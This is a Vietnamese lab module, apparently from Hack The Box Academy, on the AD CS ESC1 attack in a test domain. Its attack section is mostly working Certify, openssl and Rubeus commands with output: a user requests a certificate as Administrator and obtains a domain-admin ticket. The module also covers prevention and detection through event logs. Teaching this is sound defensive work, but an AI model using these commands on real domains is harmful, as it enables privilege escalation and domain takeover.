# PKI - ESC1


## Mô tả

Sau khi `SpectreOps` công bố bài nghiên cứu [Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf), `Active Directory Certificate Services` (`AD CS`) trở thành một trong những attack vector được giới tấn công ưa chuộng nhất vì nhiều lý do, bao gồm:

1) Dùng certificate để xác thực có nhiều lợi thế hơn thông tin đăng nhập username/password thông thường.
2) Hầu hết các PKI server đều bị cấu hình sai/dễ bị tổn thương bởi ít nhất một trong tám tấn công mà SpectreOps phát hiện (nhiều nhà nghiên cứu khác đã tìm ra thêm nhiều tấn công kể từ đó).

Có vô số lợi thế khi dùng certificate và chiếm quyền `Certificate Authority` (`CA`):

- Certificate của user và machine có hiệu lực từ 1 năm trở lên.
- Reset password của user không làm certificate mất hiệu lực. Với certificate, dù user đổi password bao nhiêu lần cũng không quan trọng; certificate vẫn hợp lệ (trừ khi hết hạn hoặc bị thu hồi).
- Các template bị cấu hình sai cho phép lấy certificate cho bất kỳ user nào.
- Chiếm được private key của CA cho phép giả mạo (forge) `Golden Certificates`.

Những lợi thế này khiến certificate trở thành phương pháp được ưa chuộng để persistence lâu dài. Dù SpectreOps đã tiết lộ tám kỹ thuật leo thang đặc quyền (privilege escalation), ta sẽ xem xét kỹ thuật đầu tiên, `ESC1`, để minh họa cách nó hoạt động. Mô tả của `ESC1` là:
- `Domain escalation via No Issuance Requirements + Enrollable Client Authentication/Smart Card Logon OID templates + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`.

---

## Tấn công

Để bắt đầu, ta sẽ dùng [Certify](https://github.com/GhostPack/Certify) để quét môi trường tìm các lỗ hổng trong hạ tầng PKI:

```powershell-session
PS C:\Users\bob\Downloads> .\Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=eagle,DC=local'

[*] Listing info about the Enterprise CA 'eagle-PKI-CA'

    Enterprise CA Name            : eagle-PKI-CA
    DNS Hostname                  : PKI.eagle.local
    FullName                      : PKI.eagle.local\eagle-PKI-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=eagle-PKI-CA, DC=eagle, DC=local
    Cert Thumbprint               : 7C59C4910A1C853128FE12C17C2A54D93D1EECAA
    Cert Serial                   : 780E7B38C053CCAB469A33CFAAAB9ECE
    Cert Start Date               : 09/08/2022 14.07.25
    Cert End Date                 : 09/08/2522 14.17.25
    Cert Chain                    : CN=eagle-PKI-CA,DC=eagle,DC=local
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               EAGLE\Domain Admins           S-1-5-21-1518138621-4282902758-752445584-512
      Allow  ManageCA, ManageCertificates               EAGLE\Enterprise Admins       S-1-5-21-1518138621-4282902758-752445584-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : PKI.eagle.local\eagle-PKI-CA
    Template Name                         : UserCert
    Schema Version                        : 4
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email, Smart Card Log-on
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email, Smart Card Log-on
    Permissions
      Enrollment Permissions
        Enrollment Rights           : EAGLE\Domain Admins           S-1-5-21-1518138621-4282902758-752445584-512
                                      EAGLE\Domain Users            S-1-5-21-1518138621-4282902758-752445584-513
                                      EAGLE\Enterprise Admins       S-1-5-21-1518138621-4282902758-752445584-519
      Object Control Permissions
        Owner                       : EAGLE\Administrator           S-1-5-21-1518138621-4282902758-752445584-500
        WriteOwner Principals       : EAGLE\Administrator           S-1-5-21-1518138621-4282902758-752445584-500
                                      EAGLE\Domain Admins           S-1-5-21-1518138621-4282902758-752445584-512
                                      EAGLE\Enterprise Admins       S-1-5-21-1518138621-4282902758-752445584-519
        WriteDacl Principals        : EAGLE\Administrator           S-1-5-21-1518138621-4282902758-752445584-500
                                      EAGLE\Domain Admins           S-1-5-21-1518138621-4282902758-752445584-512
                                      EAGLE\Enterprise Admins       S-1-5-21-1518138621-4282902758-752445584-519
        WriteProperty Principals    : EAGLE\Administrator           S-1-5-21-1518138621-4282902758-752445584-500
                                      EAGLE\Domain Admins           S-1-5-21-1518138621-4282902758-752445584-512
                                      EAGLE\Enterprise Admins       S-1-5-21-1518138621-4282902758-752445584-519

Certify completed in 00:00:00.9120044
```

![Chi tiết certificate template dễ bị tấn công: UserCert, hiệu lực 10 năm, dùng cho client authentication, với enrollment rights cho Domain Admins và Users.](images/certifyRequest.png)

Khi kiểm tra mục 'Vulnerable Certificate Templates' trong output của Certify, ta sẽ thấy liệt kê một template duy nhất với khá nhiều thông tin về nó. Ta có thể biết tên CA trong môi trường là `PKI.eagle.local\eagle-PKI-CA`, và template dễ bị tấn công có tên `UserCert`. Template này dễ bị tấn công vì:

- Mọi Domain user đều có thể yêu cầu certificate trên template này.
- Có cờ [CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1), cho phép bên yêu cầu tự chỉ định `SAN` (do đó, bất kỳ user nào cũng có thể yêu cầu certificate với tư cách bất kỳ user nào khác trong mạng, kể cả các user đặc quyền).
- Không yêu cầu manager phê duyệt (certificate được cấp ngay sau yêu cầu mà không cần phê duyệt).
- Certificate có thể dùng cho 'Client Authentication' (ta có thể dùng nó để đăng nhập/xác thực).

Để lạm dụng template này, ta sẽ dùng `Certify` và truyền tham số `request`, chỉ định đầy đủ tên CA, tên template dễ bị tấn công và tên user, ví dụ `Administrator`:

```powershell-session
PS C:\Users\bob\Downloads> .\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : EAGLE\bob
[*] No subject name specified, using current context as subject.

[*] Template                : UserCert
[*] Subject                 : CN=bob, OU=EagleUsers, DC=eagle, DC=local
[*] AltName                 : Administrator

[*] Certificate Authority   : PKI.eagle.local\eagle-PKI-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 36

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIE...
<SNIP>
<SNIP>
wgP7EwPpxHKOrlZr6H+5lS58u/9EuIgdSk1X3VWuZvWRdjL15ovn
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGLzCCBRegAwIBAgITFgAAACx6zV6bbfN1ZQAAAAAALDANBgkqhkiG9w0BAQsF
<SNIP>
<SNIP>
eVAB
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx


Certify completed in 00:00:15.8803493
```

![Certify.exe request: Bob yêu cầu một certificate với tư cách Administrator; certificate đã được cấp.](images/requestCert.png)

Khi tấn công kết thúc, ta sẽ lấy được certificate thành công. Lệnh này tạo ra một certificate `PEM` và hiển thị nó dưới dạng base64. Ta cần chuyển certificate `PEM` sang định dạng [PFX](https://learn.microsoft.com/en-us/windows-hardware/drivers/install/personal-information-exchange---pfx--files) bằng cách chạy lệnh được nêu trong output của Certify (khi được hỏi password, nhấn `Enter` mà không nhập gì); tuy nhiên, để chắc chắn, trước tiên hãy chạy lệnh dưới đây để tránh định dạng sai của file `PEM`.

```shell-session
[!bash!]$ sed -i 's/\s\s\+/\n/g' cert.pem
```

Sau đó ta có thể chạy lệnh `openssl` được nêu trong output của Certify.

```shell-session
[!bash!]$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

![Lệnh OpenSSL xuất cert.pem sang cert.pfx với lời nhắc nhập password.](images/convertPEM.png)

Giờ đã có certificate ở định dạng `PFX` dùng được (mà `Rubeus` hỗ trợ), ta có thể yêu cầu một Kerberos TGT cho tài khoản `Administrator` và xác thực bằng certificate:

```powershell-session
PS C:\Users\bob\Downloads> .\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=bob, OU=EagleUsers, DC=eagle, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'eagle.local\Administrator'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      LmxvY2Fs
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/eagle.local
  ServiceRealm             :  EAGLE.LOCAL
  UserName                 :  Administrator
  UserRealm                :  EAGLE.LOCAL
  StartTime                :  19/12/2022 21.04.53
  EndTime                  :  20/12/2022 07.04.53
  RenewTill                :  26/12/2022 21.04.53
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  KQTCgNhj3sh4yXvrBwTfeg==
  ASREP (key)              :  2EB79553702442F11E93044E3C915490
```

![Lệnh Rubeus yêu cầu TGT cho Administrator bằng cert.pfx; ticket được import thành công.](images/certLogin.png)

Sau khi xác thực thành công, ta sẽ có thể liệt kê nội dung của share `C$` trên DC1:

```powershell-session
PS C:\Users\bob\Downloads> dir \\dc1\c$

    Directory: \\dc1\c$


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/15/2022   6:30 PM                DFSReports
d-----        10/13/2022  11:23 PM                Mimikatz
d-----          9/1/2022   9:49 PM                PerfLogs
d-r---        11/28/2022  10:59 AM                Program Files
d-----          9/1/2022   2:02 PM                Program Files (x86)
d-----        12/13/2022  11:22 AM                scripts
d-r---          8/7/2022   9:31 PM                Users
d-----        11/28/2022  11:27 AM                Windows
```

![Command prompt hiển thị danh sách thư mục của \dc1\c$ với các thư mục như DFSReports và Mimikatz.](images/dirDC1.png)

---

## Phòng ngừa

Tấn công sẽ không thể thực hiện được nếu cờ `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` không được bật trong certificate template. Một cách khác để ngăn chặn tấn công này là yêu cầu `CA certificate manager approval` trước khi cấp certificate; điều này đảm bảo không có certificate nào trên các template tiềm ẩn nguy hiểm được cấp mà không có phê duyệt thủ công (mà hy vọng là tương quan được rằng yêu cầu bắt nguồn từ một user hợp lệ).

Vì có nhiều kỹ thuật leo thang đặc quyền khác nhau, rất nên quét môi trường định kỳ bằng `Certify` hoặc các công cụ tương tự khác để tìm các vấn đề PKI tiềm tàng.

---

## Phát hiện

Khi CA tạo certificate, hai event sẽ được ghi log: một cho yêu cầu nhận được và một cho certificate đã cấp, nếu thành công. Các event này có ID là `4886` và `4887` như minh họa dưới đây:

![Event 4886 và 4887: Bob đã yêu cầu và nhận một certificate; không có chi tiết SAN.](images/eventBob.png)

Đáng tiếc, ta chỉ có thể biết rằng Bob đã yêu cầu một certificate từ WS001; ta không thể biết liệu yêu cầu có chỉ định SAN hay không.

CA chứa danh sách tất cả certificate đã cấp, nên nếu nhìn vào đó, ta sẽ thấy yêu cầu cho certificate ID 36 (yêu cầu từ kịch bản tấn công ở trên):

![Yêu cầu certificate bởi EAGLE\bob cho UserCert, hiệu lực từ 10/16/2022, hết hạn 10/16/2024.](images/detectCert1.png)

Tổng quan chung của công cụ GUI cũng không hiển thị SAN, nhưng ta có thể biết rằng một certificate đã được cấp qua template dễ bị tấn công. Nếu muốn tìm thông tin SAN, ta cần mở chính certificate đó:

![Chi tiết certificate hiển thị Subject Alternative Name là Principal Name=Administrator.](images/detectCert2.png)

Cũng có khả năng xem việc đó bằng lập trình: lệnh `certutil -view` sẽ dump mọi thứ trên CA cùng toàn bộ thông tin về từng certificate (lượng dữ liệu này có thể cực lớn trong một môi trường lớn):

![Yêu cầu certificate bởi Bob cho Administrator dùng template UserCert từ WS001.](images/certpieces.png)

Với một chút scripting, ta có thể tự động hóa việc phân tích và phát hiện các template dễ bị tấn công bị kẻ xấu lạm dụng.

Cuối cùng, nếu bạn còn nhớ, trong cuộc tấn công, ta đã dùng certificate lấy được để xác thực và nhận một TGT; AD sẽ ghi log yêu cầu này với event ID `4768`, event này sẽ có cụ thể thông tin về lần đăng nhập bằng certificate:

![Event 4768: Administrator đã yêu cầu Kerberos TGT từ IP 172.16.18.25; có kèm chi tiết certificate.](images/detect1.png)

Lưu ý rằng các event `4886` và `4887` sẽ được sinh ra trên máy cấp certificate chứ không phải trên domain controller. Nếu không có quyền truy cập GUI, ta có thể dùng PSSession để tương tác với máy PKI, và cmdlet `Get-WinEvent` để tìm các event:

```cmd-session
C:\Users\bob\Downloads>runas /user:eagle\htb-student powershell

Enter the password for eagle\htb-student:
Attempting to start powershell as user "eagle\htb-student" ...
```

```powershell-session
PS C:\WINDOWS\system32> New-PSSession PKI

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  4 WinRM4          PKI             RemoteMachine   Opened        Microsoft.PowerShell     Available

PS C:\WINDOWS\system32> Enter-PSSession PKI

[PKI]: PS C:\Users\htb-student\Documents> Get-WINEvent -FilterHashtable @{Logname='Security'; ID='4886'}


   ProviderName: Microsoft-Windows-Security-Auditing

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
4/13/2023 4:05:50 PM          4886 Information      Certificate Services received a certificate request....
4/11/2023 1:24:02 PM          4886 Information      Certificate Services received a certificate request....
4/11/2023 1:15:01 PM          4886 Information      Certificate Services received a certificate request....


[PKI]: PS C:\Users\htb-student\Documents> Get-WINEvent -FilterHashtable @{Logname='Security'; ID='4887'}


   ProviderName: Microsoft-Windows-Security-Auditing

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
4/13/2023 4:06:05 PM          4887 Information      Certificate Services approved a certificate request and...
4/13/2023 4:06:02 PM          4887 Information      Certificate Services approved a certificate request and...
4/11/2023 1:24:14 PM          4887 Information      Certificate Services approved a certificate request and...
4/11/2023 1:24:14 PM          4887 Information      Certificate Services approved a certificate request and...
4/11/2023 1:15:12 PM          4887 Information      Certificate Services approved a certificate request and..
```

Để xem toàn bộ audit log của các event, ta có thể pipe output vào `Format-List`, hoặc lưu các event vào một mảng và kiểm tra từng cái:

```powershell-session
[pki]: PS C:\Users\htb-student\Documents> $events = Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}
[pki]: PS C:\Users\htb-student\Documents> $events[0] | Format-List -Property *


Message              : Certificate Services received a certificate request.

                       Request ID:      51
                       Requester:       EAGLE\DC2$
                       Attributes:
                       CertificateTemplate:DomainController
                       ccm:PKI.eagle.local
Id                   : 4886
Version              : 0
Qualifiers           :
Level                : 0
Task                 : 12805
Opcode               : 0
Keywords             : -9214364837600034816
RecordId             : 21100
ProviderName         : Microsoft-Windows-Security-Auditing
ProviderId           : 54849625-5478-4994-a5ba-3e3b0328c30d
LogName              : Security
ProcessId            : 660
ThreadId             : 772
MachineName          : PKI.eagle.local
UserId               :
TimeCreated          : 4/11/2023 1:24:02 PM
ActivityId           : dcf643ef-6c67-0000-6e44-f6dc676cd901
RelatedActivityId    :
ContainerLog         : Security
MatchedQueryIds      : {}
Bookmark             : System.Diagnostics.Eventing.Reader.EventBookmark
LevelDisplayName     : Information
OpcodeDisplayName    : Info
TaskDisplayName      : Certification Services
KeywordsDisplayNames : {Audit Success}
Properties           : {System.Diagnostics.Eventing.Reader.EventProperty, System.Diagnostics.Eventing.Reader.EventProperty, System.Diagnostics.Eventing.Reader.EventProperty}
```
---

<div class="card bg-light">
    <div class="card-body">
				 <p class="mb-0">Vui lòng chờ 7-10 phút sau khi spawn target của các câu hỏi bên dưới trước khi yêu cầu/tạo bất kỳ AD certificate nào!

				   
Để cải thiện hiệu năng RDP, nên trước tiên SSH vào kali host trong khi bật [dynamic port forwarding](https://academy.hackthebox.com/module/158/section/1426), sau đó kết nối RDP tới WS001 từ attack host của bạn bằng proxychains.</p>
    </div>
</div>
